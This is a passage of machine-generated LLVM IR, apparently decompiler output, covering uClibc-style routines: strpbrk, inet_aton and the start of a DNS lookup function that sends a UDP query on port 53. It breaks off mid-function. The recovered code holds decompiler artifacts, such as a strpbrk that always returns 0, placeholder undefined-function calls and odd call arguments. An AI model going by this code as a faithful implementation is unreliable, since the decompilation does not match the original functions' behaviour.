dec_label_pc_1000d888:                            ; preds = %dec_label_pc_1000d870
  store i32 268490892, i32* @lr, align 4
  %v4_1000d888 = call i32 @rawmemchr(i32 %v0_1000d87c, i32 0, i32 0)
  %v0_1000d88c = load i32, i32* @r31, align 4
  store i32 %v0_1000d88c, i32* %r0.global-to-local, align 4
  %v1_1000d890 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d890 = inttoptr i32 %v1_1000d890 to i32*
  store i32 %v4_1000d888, i32* %v2_1000d890, align 4
  br label %dec_label_pc_1000d8a8

dec_label_pc_1000d898:                            ; preds = %dec_label_pc_1000d870
  %v1_1000d878 = inttoptr i32 %v3_1000d870 to i8*
  store i8 0, i8* %v1_1000d878, align 1
  %v0_1000d8a0 = load i32, i32* @r31, align 4
  store i32 %v0_1000d8a0, i32* %r0.global-to-local, align 4
  %v0_1000d8a4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d8a4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d8a4 = inttoptr i32 %v1_1000d8a4 to i32*
  store i32 %v0_1000d8a4, i32* %v2_1000d8a4, align 4
  br label %dec_label_pc_1000d8a8

dec_label_pc_1000d8a8:                            ; preds = %dec_label_pc_1000d888, %dec_label_pc_1000d868, %dec_label_pc_1000d898
  %v0_1000d8a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d824, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d8a8

; uselistorder directives
  uselistorder i32 %v3_1000d870, { 2, 0, 1 }
  uselistorder i32 %v2_1000d850, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000d844, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1000d8a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d844, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000d8e01 = load i32, i32* @r3, align 4
  %v1_1000d8e02 = inttoptr i32 %v0_1000d8e01 to i8*
  %v2_1000d8e03 = load i8, i8* %v1_1000d8e02, align 1
  %v3_1000d8e04 = zext i8 %v2_1000d8e03 to i32
  store i32 %v3_1000d8e04, i32* %r11.global-to-local, align 4
  %v3_1000d8e46 = icmp eq i8 %v2_1000d8e03, 0
  br i1 %v3_1000d8e46, label %dec_label_pc_1000d8f4, label %dec_label_pc_1000d8ec

dec_label_pc_1000d8c4:                            ; preds = %dec_label_pc_1000d8c8
  %v3_1000d8c8 = zext i8 %v2_1000d8c8 to i32
  %v4_1000d8d4 = icmp eq i32 %v3_1000d8c8, %v1_1000d8d4
  %v0_1000d8c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d8d4, i32 %v0_1000d8c4)
  %v0_1000d8c8.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d8d4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d8c8

dec_label_pc_1000d8c8:                            ; preds = %dec_label_pc_1000d8ec, %dec_label_pc_1000d8c4
  %v1_1000d8d4 = phi i32 [ %v1_1000d8d49, %dec_label_pc_1000d8ec ], [ %v1_1000d8d4.pre, %dec_label_pc_1000d8c4 ]
  %v0_1000d8c8 = phi i32 [ %tmp, %dec_label_pc_1000d8ec ], [ %v0_1000d8c8.pre, %dec_label_pc_1000d8c4 ]
  %v1_1000d8c8 = inttoptr i32 %v0_1000d8c8 to i8*
  %v2_1000d8c8 = load i8, i8* %v1_1000d8c8, align 1
  %v1_1000d8cc = add i32 %v0_1000d8c8, 1
  store i32 %v1_1000d8cc, i32* %r9.global-to-local, align 4
  %v3_1000d8d0 = icmp eq i8 %v2_1000d8c8, 0
  br i1 %v3_1000d8d0, label %dec_label_pc_1000d8dc, label %dec_label_pc_1000d8c4

dec_label_pc_1000d8dc:                            ; preds = %dec_label_pc_1000d8c8
  %v0_1000d8dc = load i32, i32* @r3, align 4
  %v1_1000d8dc = add i32 %v0_1000d8dc, 1
  store i32 %v1_1000d8dc, i32* @r3, align 4
  %v1_1000d8e0 = inttoptr i32 %v1_1000d8dc to i8*
  %v2_1000d8e0 = load i8, i8* %v1_1000d8e0, align 1
  %v3_1000d8e0 = zext i8 %v2_1000d8e0 to i32
  store i32 %v3_1000d8e0, i32* %r11.global-to-local, align 4
  %v3_1000d8e4 = icmp eq i8 %v2_1000d8e0, 0
  br i1 %v3_1000d8e4, label %dec_label_pc_1000d8f4, label %dec_label_pc_1000d8ec

dec_label_pc_1000d8ec:                            ; preds = %entry, %dec_label_pc_1000d8dc
  %v1_1000d8d49 = phi i32 [ %v3_1000d8e0, %dec_label_pc_1000d8dc ], [ %v3_1000d8e04, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d8c8

dec_label_pc_1000d8f4:                            ; preds = %dec_label_pc_1000d8dc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000d8c8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d8ec, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000d8fc = icmp eq i8* %arg1, null
  br i1 %v3_1000d8fc, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d904

dec_label_pc_1000d904:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000d918.pre = load i32, i32* @global_var_100249e8, align 4
  br label %dec_label_pc_1000d914

dec_label_pc_1000d914:                            ; preds = %dec_label_pc_1000d904, %dec_label_pc_1000d98c
  %v0_1000d98c = phi i32 [ 0, %dec_label_pc_1000d904 ], [ %v2_1000d994, %dec_label_pc_1000d98c ]
  %v0_1000d990 = phi i32 [ 1, %dec_label_pc_1000d904 ], [ %v1_1000d990, %dec_label_pc_1000d98c ]
  %v0_1000d914 = phi i32 [ %tmp, %dec_label_pc_1000d904 ], [ %v0_1000d9143, %dec_label_pc_1000d98c ]
  %v1_1000d914 = inttoptr i32 %v0_1000d914 to i8*
  %v2_1000d914 = load i8, i8* %v1_1000d914, align 1
  %v3_1000d914 = zext i8 %v2_1000d914 to i32
  %v1_1000d91c = mul nuw nsw i32 %v3_1000d914, 2
  %v2_1000d920 = add i32 %v1_1000d91c, %v3_1000d918.pre
  %v3_1000d920 = inttoptr i32 %v2_1000d920 to i16*
  %v4_1000d920 = load i16, i16* %v3_1000d920, align 2
  %v1_1000d924 = and i16 %v4_1000d920, 8
  %v3_1000d924 = icmp eq i16 %v1_1000d924, 0
  br i1 %v3_1000d924, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d92c

dec_label_pc_1000d92c:                            ; preds = %dec_label_pc_1000d914
  br label %dec_label_pc_1000d944

dec_label_pc_1000d934:                            ; preds = %dec_label_pc_1000d944
  %v1_1000d948 = mul i32 %v1_1000d994, 10
  %v2_1000d950 = add i32 %v3_1000d944, %v1_1000d948
  %v1_1000d934 = add i32 %v2_1000d950, -48
  %v1_1000d938 = add i32 %v0_1000d97c, 1
  %v2_1000d93c = icmp sgt i32 %v1_1000d934, 255
  br i1 %v2_1000d93c, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d944

dec_label_pc_1000d944:                            ; preds = %dec_label_pc_1000d934, %dec_label_pc_1000d92c
  %v1_1000d994 = phi i32 [ %v1_1000d934, %dec_label_pc_1000d934 ], [ 0, %dec_label_pc_1000d92c ]
  %v0_1000d97c = phi i32 [ %v1_1000d938, %dec_label_pc_1000d934 ], [ %v0_1000d914, %dec_label_pc_1000d92c ]
  %v1_1000d944 = inttoptr i32 %v0_1000d97c to i8*
  %v2_1000d944 = load i8, i8* %v1_1000d944, align 1
  %v3_1000d944 = zext i8 %v2_1000d944 to i32
  %v1_1000d94c = mul nuw nsw i32 %v3_1000d944, 2
  %v2_1000d954 = add i32 %v1_1000d94c, %v3_1000d918.pre
  %v3_1000d954 = inttoptr i32 %v2_1000d954 to i16*
  %v4_1000d954 = load i16, i16* %v3_1000d954, align 2
  %v5_1000d954 = zext i16 %v4_1000d954 to i32
  %v1_1000d958 = and i32 %v5_1000d954, 8
  %v3_1000d958 = icmp eq i32 %v1_1000d958, 0
  br i1 %v3_1000d958, label %dec_label_pc_1000d960, label %dec_label_pc_1000d934

dec_label_pc_1000d960:                            ; preds = %dec_label_pc_1000d944
  %v2_1000d960 = icmp sgt i32 %v0_1000d990, 3
  br i1 %v2_1000d960, label %dec_label_pc_1000d978, label %dec_label_pc_1000d968

dec_label_pc_1000d968:                            ; preds = %dec_label_pc_1000d960
  %v3_1000d968 = icmp eq i8 %v2_1000d944, 46
  br i1 %v3_1000d968, label %dec_label_pc_1000d970, label %dec_label_pc_1000d9b4

dec_label_pc_1000d970:                            ; preds = %dec_label_pc_1000d968
  %v1_1000d970 = add i32 %v0_1000d97c, 1
  br label %dec_label_pc_1000d98c

dec_label_pc_1000d978:                            ; preds = %dec_label_pc_1000d960
  %v3_1000d978 = icmp eq i8 %v2_1000d944, 0
  %v1_1000d97c = add i32 %v0_1000d97c, 1
  br i1 %v3_1000d978, label %dec_label_pc_1000d98c, label %dec_label_pc_1000d984

dec_label_pc_1000d984:                            ; preds = %dec_label_pc_1000d978
  %v1_1000d984 = and i32 %v5_1000d954, 32
  %v3_1000d984 = icmp eq i32 %v1_1000d984, 0
  br i1 %v3_1000d984, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d98c

dec_label_pc_1000d98c:                            ; preds = %dec_label_pc_1000d984, %dec_label_pc_1000d978, %dec_label_pc_1000d970
  %v0_1000d9143 = phi i32 [ %v1_1000d97c, %dec_label_pc_1000d984 ], [ %v1_1000d97c, %dec_label_pc_1000d978 ], [ %v1_1000d970, %dec_label_pc_1000d970 ]
  %v1_1000d98c = mul i32 %v0_1000d98c, 256
  %v1_1000d990 = add nuw nsw i32 %v0_1000d990, 1
  %v2_1000d994 = or i32 %v1_1000d994, %v1_1000d98c
  store i32 %v2_1000d994, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000d990, 5
  br i1 %tmp10, label %dec_label_pc_1000d914, label %dec_label_pc_1000d9a0

dec_label_pc_1000d9a0:                            ; preds = %dec_label_pc_1000d98c
  %v0_1000d9a0 = load i32, i32* @r4, align 4
  %v3_1000d9a0 = icmp eq i32 %v0_1000d9a0, 0
  %v0_1000d9a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d9a0, i32 %v0_1000d9a8)
  %v0_1000d9ac = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d9ac = load i32, i32* @r4, align 4
  %v2_1000d9ac = inttoptr i32 %v1_1000d9ac to i32*
  store i32 %v0_1000d9ac, i32* %v2_1000d9ac, align 4
  ret i32 1

dec_label_pc_1000d9b4:                            ; preds = %dec_label_pc_1000d968, %dec_label_pc_1000d984, %dec_label_pc_1000d914, %dec_label_pc_1000d934, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000d994, { 1, 0 }
  uselistorder i32 %v1_1000d990, { 1, 0 }
  uselistorder i32 %v0_1000d97c, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9b4, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000d914, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_1000d9c0 = load i32, i32* @lr, align 4
  store i32 %v0_1000d9c0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268491244, i32* @lr, align 4
  %v0_1000d9e8 = call i32 @malloc()
  store i32 %v0_1000d9e8, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268491256, i32* @lr, align 4
  %v0_1000d9f4 = call i32 @malloc()
  %v0_1000d9f8 = load i32, i32* @r30, align 4
  %v3_1000d9f8 = icmp eq i32 %v0_1000d9f8, 0
  store i32 %v0_1000d9f4, i32* @r21, align 4
  br i1 %v3_1000d9f8, label %dec_label_pc_1000dfb4, label %dec_label_pc_1000da04

dec_label_pc_1000da04:                            ; preds = %entry
  %v3_1000da04 = icmp eq i32 %v0_1000d9f4, 0
  br i1 %v3_1000da04, label %dec_label_pc_1000dfb4, label %dec_label_pc_1000da0c

dec_label_pc_1000da0c:                            ; preds = %dec_label_pc_1000da04
  %v0_1000da0c = load i32, i32* @r23, align 4
  %v3_1000da0c = icmp eq i32 %v0_1000da0c, 0
  br i1 %v3_1000da0c, label %dec_label_pc_1000dfb4, label %dec_label_pc_1000da14

dec_label_pc_1000da14:                            ; preds = %dec_label_pc_1000da0c
  %v0_1000da14 = load i32, i32* %r14.global-to-local, align 4
  %v1_1000da14 = inttoptr i32 %v0_1000da14 to i8*
  %v2_1000da14 = load i8, i8* %v1_1000da14, align 1
  %v3_1000da14 = zext i8 %v2_1000da14 to i32
  store i32 %v3_1000da14, i32* %r0.global-to-local, align 4
  %v3_1000da18 = icmp eq i8 %v2_1000da14, 0
  br i1 %v3_1000da18, label %dec_label_pc_1000dfb4, label %dec_label_pc_1000da20

dec_label_pc_1000da20:                            ; preds = %dec_label_pc_1000da14
  store i32 %v0_1000da14, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  %v0_1000da28 = call i32 @__GI_strlen()
  %v0_1000da30 = load i32, i32* %r14.global-to-local, align 4
  %v2_1000da30 = add i32 %v0_1000da30, %v0_1000da28
  %v1_1000da38 = add i32 %v2_1000da30, -1
  %v2_1000da38 = inttoptr i32 %v1_1000da38 to i8*
  %v3_1000da38 = load i8, i8* %v2_1000da38, align 1
  %v4_1000da38 = zext i8 %v3_1000da38 to i32
  store i32 %v4_1000da38, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002acc8.650 to i32), i32* %r29.global-to-local, align 4
  %v2_1000da40 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_1000da40, i32* %r28.global-to-local, align 4
  store i32 %v2_1000da40, i32* @r3, align 4
  %v1_1000da4c = xor i32 %v4_1000da38, 46
  store i32 %v1_1000da4c, i32* %r17.global-to-local, align 4
  %v0_1000da50 = call i32 @__pthread_return_void()
  %v0_1000da58 = call i32 @__pthread_return_0()
  %v3_1000da60 = load i32, i32* @global_var_10024a88.651, align 4
  store i32 %v3_1000da60, i32* %r11.global-to-local, align 4
  %v3_1000da6c = load i16, i16* @global_var_100249a4.652, align 2
  %v4_1000da6c = zext i16 %v3_1000da6c to i32
  store i32 %v4_1000da6c, i32* @r25, align 4
  %v1_1000da70 = load i32, i32* @r23, align 4
  store i32 %v2_1000da40, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_1000da70 = srem i32 %v3_1000da60, %v1_1000da70
  %v2_1000da8c = sub i32 %v3_1000da60, %v2_1000da70
  store i32 %v2_1000da8c, i32* %r0.global-to-local, align 4
  store i32 %v2_1000da70, i32* @r26, align 4
  %v0_1000da94 = call i32 @__pthread_return_void()
  %v0_1000dfa8.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_1000dfa8.pr19, 3
  br i1 %tmp57, label %dec_label_pc_1000da9c.lr.ph.lr.ph, label %dec_label_pc_1000dfc0

dec_label_pc_1000da9c.lr.ph.lr.ph:                ; preds = %dec_label_pc_1000da20
  %v2_1000dab4 = ptrtoint i32* %stack_var_-144 to i32
  %v2_1000dbc8 = ptrtoint i32* %stack_var_-204 to i32
  %v2_1000dc28 = ptrtoint i16* %stack_var_-212 to i32
  %v2_1000dc6c = ptrtoint i32* %stack_var_-248 to i32
  %v3_1000dcc8 = icmp eq i32 %tmp37, 0
  %v3_1000dcd4 = icmp eq i32 %tmp36, 3
  %v2_1000dd50 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1000dda4 = ptrtoint i32* %stack_var_-184 to i32
  %v3_1000ddd0 = icmp eq i32 %tmp33, 0
  %v3_1000dd44 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_1000da9c.lr.ph

dec_label_pc_1000da9c:                            ; preds = %dec_label_pc_1000da9c.lr.ph, %dec_label_pc_1000dc4c
  %v0_1000da9c = load i32, i32* @r19, align 4
  %v3_1000da9c = icmp eq i32 %v0_1000da9c, -1
  br i1 %v3_1000da9c, label %dec_label_pc_1000daac, label %dec_label_pc_1000daa4

dec_label_pc_1000daa4:                            ; preds = %dec_label_pc_1000da9c
  store i32 268491436, i32* @lr, align 4
  %v1_1000daa8 = call i32 @__libc_close(i32 %v0_1000da9c)
  br label %dec_label_pc_1000daac

dec_label_pc_1000daac:                            ; preds = %dec_label_pc_1000da9c, %dec_label_pc_1000daa4
  store i32 %v2_1000dab4, i32* %r29.global-to-local, align 4
  %v0_1000dab8 = load i32, i32* @r30, align 4
  store i32 268491456, i32* @lr, align 4
  %v3_1000dabc = call i32 @__GI_memset(i32 %v0_1000dab8, i32 0, i32 512)
  store i32 268491472, i32* @lr, align 4
  %v3_1000dacc = call i32 @__GI_memset(i32 %v2_1000dab4, i32 0, i32 48)
  %v0_1000dad0 = load i32, i32* @r25, align 4
  %v1_1000dad0 = add i32 %v0_1000dad0, 1
  %v1_1000dad4 = urem i32 %v1_1000dad0, 65536
  store i32 %v1_1000dad4, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000dae0 = load i32, i32* @r30, align 4
  store i32 %v1_1000dad4, i32* %stack_var_-144, align 4
  %v4_1000daf4 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_1000dae0, i32 512)
  store i32 %v4_1000daf4, i32* %r28.global-to-local, align 4
  %v1_1000daf8 = icmp slt i32 %v4_1000daf4, 0
  br i1 %v1_1000daf8, label %dec_label_pc_1000dfc0, label %dec_label_pc_1000db00

dec_label_pc_1000db00:                            ; preds = %dec_label_pc_1000daac
  %v0_1000db00 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_1000db00, i32* @r4, align 4
  %v0_1000db08 = load i32, i32* @r21, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268491540, i32* @lr, align 4
  %v4_1000db10 = call i32 @strncpy(i32 %v0_1000db08, i32 %v0_1000db00, i32 1025)
  store i32 ptrtoint (i32* @global_var_100249a8.603 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000da40, i32* @r3, align 4
  %v0_1000db28 = call i32 @__pthread_return_void()
  %v0_1000db30 = call i32 @__pthread_return_0()
  %v0_1000db34 = load i32, i32* @r22, align 4
  %v1_1000db34 = icmp slt i32 %v0_1000db34, 0
  %v0_1000db3c = load i32, i32* @r26, align 4
  %v1_1000db3c = mul i32 %v0_1000db3c, 4
  store i32 %v1_1000db3c, i32* %r0.global-to-local, align 4
  %v2_1000db40 = add i32 %v1_1000db3c, %arg4
  %v3_1000db40 = inttoptr i32 %v2_1000db40 to i32*
  %v4_1000db40 = load i32, i32* %v3_1000db40, align 4
  store i32 %v4_1000db40, i32* %r29.global-to-local, align 4
  br i1 %v1_1000db34, label %dec_label_pc_1000db88, label %dec_label_pc_1000db48

dec_label_pc_1000db48:                            ; preds = %dec_label_pc_1000db00
  %v3_1000db4c = load i32, i32* @global_var_10024a90.654, align 4
  store i32 %v3_1000db4c, i32* %r0.global-to-local, align 4
  %v2_1000db50 = icmp slt i32 %v0_1000db34, %v3_1000db4c
  br i1 %v2_1000db50, label %dec_label_pc_1000db58, label %dec_label_pc_1000db88

dec_label_pc_1000db58:                            ; preds = %dec_label_pc_1000db48
  store i32 ptrtoint (i32* @global_var_100138b0.655 to i32), i32* @r4, align 4
  %v0_1000db64 = load i32, i32* @r21, align 4
  store i32 268491628, i32* @lr, align 4
  %v4_1000db68 = inttoptr i32 %v0_1000db64 to i8*
  %v5_1000db68 = call i32 @__GI_strncat(i8* %v4_1000db68, i32 ptrtoint (i32* @global_var_100138b0.655 to i32), i32 1025, i32 268566528)
  %v0_1000db70 = load i32, i32* @r22, align 4
  %v1_1000db70 = mul i32 %v0_1000db70, 4
  store i32 %v1_1000db70, i32* %r0.global-to-local, align 4
  %v2_1000db78 = add i32 %v1_1000db70, ptrtoint (i32* @global_var_1002ad78.656 to i32)
  %v3_1000db78 = inttoptr i32 %v2_1000db78 to i32*
  %v4_1000db78 = load i32, i32* %v3_1000db78, align 4
  store i32 %v4_1000db78, i32* @r4, align 4
  %v0_1000db7c = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000db88.657 to i32), i32* @lr, align 4
  %v4_1000db84 = inttoptr i32 %v0_1000db7c to i8*
  %v5_1000db84 = call i32 @__GI_strncat(i8* %v4_1000db84, i32 %v4_1000db78, i32 1025, i32 ptrtoint (i32* @global_var_1002ad78.656 to i32))
  br label %dec_label_pc_1000db88

dec_label_pc_1000db88:                            ; preds = %dec_label_pc_1000db48, %dec_label_pc_1000db00, %dec_label_pc_1000db58
  store i32 %v2_1000da40, i32* @r3, align 4
  %v0_1000db90 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000db9c = load i32, i32* @r30, align 4
  %v1_1000db9c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000db9c = add i32 %v1_1000db9c, %v0_1000db9c
  %v1_1000dba0 = sub i32 512, %v1_1000db9c
  %v0_1000dba8 = load i32, i32* @r21, align 4
  store i32 %v0_1000dba8, i32* %stack_var_-240, align 4
  store i32 268491700, i32* @lr, align 4
  %v4_1000dbb0 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_1000db9c, i32 %v1_1000dba0)
  store i32 %v4_1000dbb0, i32* @r27, align 4
  %v1_1000dbb4 = icmp slt i32 %v4_1000dbb0, 0
  br i1 %v1_1000dbb4, label %dec_label_pc_1000dfc0, label %dec_label_pc_1000dbbc

dec_label_pc_1000dbbc:                            ; preds = %dec_label_pc_1000db88
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000dbc4 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268491732, i32* @lr, align 4
  %v3_1000dbd0 = inttoptr i32 %v0_1000dbc4 to i8*
  %v4_1000dbd0 = call i32 @inet_pton(i32 10, i8* %v3_1000dbd0, i32 %v2_1000dbc8)
  %tmp59 = icmp slt i32 %v4_1000dbd0, 1
  br i1 %tmp59, label %dec_label_pc_1000dbe4thread-pre-split, label %dec_label_pc_1000dbdc

dec_label_pc_1000dbdc:                            ; preds = %dec_label_pc_1000dbbc
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dbe4

dec_label_pc_1000dbe4thread-pre-split:            ; preds = %dec_label_pc_1000dbbc
  %v3_1000dbe4.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dbe4

dec_label_pc_1000dbe4:                            ; preds = %dec_label_pc_1000dbe4thread-pre-split, %dec_label_pc_1000dbdc
  %v3_1000dbe4 = phi i16 [ %v3_1000dbe4.pr, %dec_label_pc_1000dbe4thread-pre-split ], [ 10, %dec_label_pc_1000dbdc ]
  %v3_1000dbe8 = icmp eq i16 %v3_1000dbe4, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_1000dbe8, label %dec_label_pc_1000dc10, label %dec_label_pc_1000dbfc

dec_label_pc_1000dbfc:                            ; preds = %dec_label_pc_1000dbe4
  %v0_1000dc00 = load i32, i32* @r29, align 4
  store i32 268491788, i32* @lr, align 4
  %v1_1000dc08 = call i32 @inet_addr(i32 %v0_1000dc00)
  %v3_1000dc10.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dc10

dec_label_pc_1000dc10:                            ; preds = %dec_label_pc_1000dbe4, %dec_label_pc_1000dbfc
  %v3_1000dc10 = phi i16 [ 10, %dec_label_pc_1000dbe4 ], [ %v3_1000dc10.pre, %dec_label_pc_1000dbfc ]
  %v4_1000dc10 = sext i16 %v3_1000dc10 to i32
  store i32 268491808, i32* @lr, align 4
  %v3_1000dc1c = call i32 @socket(i32 %v4_1000dc10, i32 2, i32 17)
  store i32 %v3_1000dc1c, i32* @r19, align 4
  %v1_1000dc20 = icmp slt i32 %v3_1000dc1c, 0
  br i1 %v1_1000dc20, label %dec_label_pc_1000dc4c, label %dec_label_pc_1000dc28

dec_label_pc_1000dc28:                            ; preds = %dec_label_pc_1000dc10
  store i32 268491828, i32* @lr, align 4
  %v3_1000dc30 = call i32 @__libc_connect(i32 %v2_1000dc28, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_1000dc30, -1
  br i1 %tmp60, label %dec_label_pc_1000dc54, label %dec_label_pc_1000dc3c

dec_label_pc_1000dc3c:                            ; preds = %dec_label_pc_1000dc28
  %v0_1000dc3c = call i32 @__errno_location()
  %v1_1000dc40 = inttoptr i32 %v0_1000dc3c to i32*
  %v2_1000dc40 = load i32, i32* %v1_1000dc40, align 4
  store i32 %v2_1000dc40, i32* %r0.global-to-local, align 4
  %v3_1000dc44 = icmp eq i32 %v2_1000dc40, 101
  br i1 %v3_1000dc44, label %dec_label_pc_1000df8c, label %dec_label_pc_1000dc4c

dec_label_pc_1000dc4c:                            ; preds = %dec_label_pc_1000dc3c, %dec_label_pc_1000dc10
  %v0_1000dc4c = load i32, i32* %r18.global-to-local, align 4
  %v1_1000dc4c = add i32 %v0_1000dc4c, 1
  store i32 %v1_1000dc4c, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_1000dc4c, 3
  br i1 %tmp61, label %dec_label_pc_1000da9c, label %dec_label_pc_1000dfc0

dec_label_pc_1000dc54:                            ; preds = %dec_label_pc_1000dc28
  %v0_1000dc54 = load i32, i32* @r28, align 4
  %v1_1000dc54 = load i32, i32* @r27, align 4
  %v2_1000dc54 = add i32 %v1_1000dc54, %v0_1000dc54
  %v0_1000dc58 = load i32, i32* @r30, align 4
  %v0_1000dc60 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_1000dc68.659 to i32), i32* @lr, align 4
  %v4_1000dc64 = call i32 @__libc_send(i32 %v0_1000dc60, i32 %v0_1000dc58, i32 %v2_1000dc54, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000dc7c = load i32, i32* @r19, align 4
  store i32 %v0_1000dc7c, i32* %stack_var_-248, align 4
  store i32 268491908, i32* @lr, align 4
  %v3_1000dc80 = call i32 @__libc_poll(i32 %v2_1000dc6c, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_1000dc80, 1
  br i1 %tmp62, label %dec_label_pc_1000df8c, label %dec_label_pc_1000dc8c

dec_label_pc_1000dc8c:                            ; preds = %dec_label_pc_1000dc54
  %v0_1000dc8c = load i32, i32* @r19, align 4
  %v0_1000dc90 = load i32, i32* @r30, align 4
  store i32 268491936, i32* @lr, align 4
  %v4_1000dc9c = call i32 @__libc_recv(i32 %v0_1000dc8c, i32 %v0_1000dc90, i32 512, i32 0)
  store i32 %v4_1000dc9c, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_1000dc9c, 12
  br i1 %tmp63, label %dec_label_pc_1000df34, label %dec_label_pc_1000dcac

dec_label_pc_1000dcac:                            ; preds = %dec_label_pc_1000dc8c
  %v0_1000dcac = load i32, i32* @r30, align 4
  %v2_1000dcb4 = inttoptr i32 %v0_1000dcac to i8*
  %v3_1000dcb4 = call i32 @__decode_header(i8* %v2_1000dcb4, i32 %v2_1000dab4)
  %v3_1000dcb8 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_1000dcb8, i32* @r20, align 4
  %v1_1000dcbc = load i32, i32* @r25, align 4
  %v4_1000dcbc = icmp eq i32 %v3_1000dcb8, %v1_1000dcbc
  br i1 %v4_1000dcbc, label %dec_label_pc_1000dcc4, label %dec_label_pc_1000df34

dec_label_pc_1000dcc4:                            ; preds = %dec_label_pc_1000dcac
  store i32 %tmp37, i32* %r0.global-to-local, align 4
